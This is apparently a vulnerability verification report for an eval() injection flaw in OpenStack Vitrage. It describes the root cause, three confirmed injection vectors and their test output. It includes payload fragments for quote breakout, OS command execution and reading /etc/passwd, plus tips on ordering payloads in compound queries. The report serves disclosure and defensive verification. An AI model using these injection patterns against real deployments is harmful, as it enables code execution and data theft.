# PoC Verification Report: CVE-2026-28370

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-28370 |
| **Affected Software** | OpenStack Vitrage < 12.0.1, 13.0.0, 14.0.0, 15.0.0 |
| **Vulnerability Type** | CWE-95 -- Eval Injection (Arbitrary Code Execution) |
| **CVSS Score** | 9.1 (Critical) |
| **Verification Status** | **CONFIRMED** |

---

## PoC Scripts

### Primary PoC: `poc.py` -- Value Injection with Multiple Impact Demonstrations

**Description**: Comprehensive PoC that demonstrates the eval() injection vulnerability through query dict VALUE injection. Includes 4 tests:
1. **Vulnerability existence check** -- Inspects source code to confirm `eval()` is present and `_evaluable_str()` does not escape quotes
2. **Arbitrary code execution** -- Writes a marker file via injected `open().write()` call
3. **OS command execution** -- Executes `id`, `whoami`, `hostname`, `uname -a` and captures output
4. **Data exfiltration** -- Reads `/etc/hostname` and `/etc/passwd` to demonstrate sensitive file access

**Run command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc.py
```

### Vector 2: `poc_vector2_key_injection.py` -- Dictionary KEY Injection

**Description**: Demonstrates that the injection also works through the dictionary KEY (not just the value). The `_evaluable_str()` function is called on both keys and values, creating a second independent injection point in the same code path.

**Run command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc_vector2_key_injection.py
```

### Vector 3: `poc_vector3_logical_operator.py` -- Compound Logical Queries

**Description**: Demonstrates that the injection works through compound queries using `and`/`or` logical operators, which are the typical real-world query format. Tests:
- Injection within `and` compound expressions
- Injection within `or` compound expressions (accounting for Python short-circuit evaluation)
- Nested compound queries (`and` containing sub-expressions)

**Run command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc_vector3_logical_operator.py
```

---

## Vulnerability Demonstrated

The PoC proves **arbitrary Python code execution** through OpenStack Vitrage's graph query parser. Specifically:

1. **Root Cause**: `create_predicate()` in `vitrage/graph/query.py` builds a Python expression string from user-controlled query dicts and passes it to `eval()`. The `_evaluable_str()` helper wraps string values in single quotes but does NOT escape embedded single quotes.

2. **Injection Mechanism**: A query dict value like `"' + MALICIOUS_CODE + '"` breaks out of the string literal, injecting arbitrary Python code into the expression string.

3. **Impact Demonstrated**:
   - Arbitrary file write (`open('/tmp/marker','w').write(...)`)
   - OS command execution (`__import__('os').popen('id').read()`)
   - Sensitive file read / data exfiltration (`open('/etc/passwd').read()`)
   - Both VALUE and KEY injection vectors confirmed
   - Compound queries (`and`, `or`, nested) are also exploitable

---

## Test Results

### Test 1: Primary PoC (`poc.py`) -- Vulnerable Container

**Command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc.py
```

**Output**:
```
╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370: OpenStack Vitrage eval() Injection PoC           ║
║   Affected: Vitrage < 12.0.1, 13.0.0, 14.0.0, 15.0.0             ║
║   CVSS: 9.1 (Critical) | CWE-95 (Eval Injection)                  ║
╚══════════════════════════════════════════════════════════════════════╝

  [PASS] vulnerability_exists
  [PASS] value_injection
  [PASS] command_execution
  [PASS] data_exfiltration

[+] ALL 4/4 TESTS PASSED
[+] CVE-2026-28370 is CONFIRMED EXPLOITABLE
```

**Result**: ALL 4/4 TESTS PASSED

---

### Test 2: Vector 2 -- KEY Injection (`poc_vector2_key_injection.py`)

**Command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc_vector2_key_injection.py
```

**Output**:
```
╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370 Vector 2: KEY-based eval() Injection              ║
╚══════════════════════════════════════════════════════════════════════╝

[+] KEY-BASED INJECTION CONFIRMED!
[+] OS COMMAND EXECUTION via KEY injection CONFIRMED!
```

**Result**: KEY INJECTION CONFIRMED -- Both file write and OS command execution succeed through the dict key

---

### Test 3: Vector 3 -- Compound Logical Queries (`poc_vector3_logical_operator.py`)

**Command**:
```bash
docker exec cve-2026-28370-vulnerable python3 /poc/poc_vector3_logical_operator.py
```

**Output**:
```
╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370 Vector 3: Logical Operator Compound Queries       ║
╚══════════════════════════════════════════════════════════════════════╝

[+] AND injection CONFIRMED!
[+] OR injection CONFIRMED!
[+] Nested injection CONFIRMED!

[+] ALL compound query injection tests PASSED
```

**Result**: ALL 3/3 COMPOUND QUERY TESTS PASSED

---

## Verification Status

### **CONFIRMED**

All three attack vectors demonstrate successful arbitrary code execution:

| Vector | Script | Status | Description |
|---|---|---|---|
| **Value injection** | `poc.py` | CONFIRMED | Injection through query dict VALUE -- file write, command exec, data exfil |
| **Key injection** | `poc_vector2_key_injection.py` | CONFIRMED | Injection through query dict KEY -- file write, command exec |
| **Compound queries** | `poc_vector3_logical_operator.py` | CONFIRMED | Injection inside `and`, `or`, and nested compound queries |

---

## Evidence Files

All evidence files are stored in `/tmp/poc_evidence/` inside the container:

| File | Content | Vector |
|---|---|---|
| `cve-2026-28370-pwned.txt` | Marker proving arbitrary file write | Value injection |
| `cmd_output.txt` | Output of `id`, `whoami`, `hostname`, `uname -a` | Value injection |
| `exfiltrated_data.txt` | `/etc/hostname` and `/etc/passwd` contents | Value injection |
| `key_injection_proof.txt` | Marker proving key-based injection | Key injection |
| `key_injection_cmd.txt` | Output of `id` command via key injection | Key injection |
| `and_injection_proof.txt` | Marker proving injection inside `and` query | Compound query |
| `or_injection_proof.txt` | Marker proving injection inside `or` query | Compound query |
| `nested_injection_cmd.txt` | `id` output from nested compound query | Compound query |

---

## Notes and Observations

### Execution Timing
The injected code executes when the returned lambda/predicate is **invoked**, not when `eval()` creates it. In the real Vitrage deployment, `create_predicate()` returns a lambda, and the caller immediately invokes it against graph vertices. So in practice, code execution is synchronous with the API request.

### Python Short-Circuit Behavior
An important nuance for compound queries: Python's `and`/`or` operators short-circuit. For `or`, if the first operand is truthy, the second (potentially malicious) operand is never evaluated. For `and`, if the first operand is falsy, the second is skipped. This means the injection's success in compound queries depends on the position of the malicious sub-expression relative to the vertex data. An attacker can control this by:
- Placing the malicious expression first in `and` (always evaluated)
- Placing the malicious expression second in `or` with a non-matching first condition
- Using a simple (non-compound) query to avoid the issue entirely

### No Authentication Required for Direct Exploitation
The PoC demonstrates direct function-level exploitation (`create_predicate()` import). In a real deployment, the API endpoints (`/v1/topology`, `/v1/resources`) require Keystone authentication, but the default policy allows ANY authenticated user (UNPROTECTED policy). If `noauth` mode is configured, no credentials are needed at all.

### Benign Payloads Used
All PoC payloads are benign (file writes to `/tmp`, reading system info, running `id`/`whoami`). No destructive or persistent modifications were made.
